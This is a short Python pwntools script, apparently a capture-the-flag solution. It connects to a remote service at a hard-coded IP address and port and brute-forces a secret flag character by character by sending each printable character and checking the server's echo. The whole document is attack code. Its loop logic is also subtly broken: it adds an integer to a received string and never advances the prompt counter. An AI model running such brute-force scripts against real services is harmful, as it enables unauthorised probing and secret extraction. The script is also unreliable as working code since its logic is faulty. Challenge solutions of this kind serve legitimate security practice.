from pwn import *


p = remote('40.78.131.39', 8889)

flag = ""
for i in range(1,30):
    x = 1
    p.recvuntil('Enter character number %s:'%(str(x)))
    for j in range(32,128):
        p.sendline(chr(j))
        print("."),
        try:
            x = p.recvuntil('\n')
            if x.strip() == chr(j):
                flag += chr(j)
                x += 1
                break
        except:
            continue
    print(flag)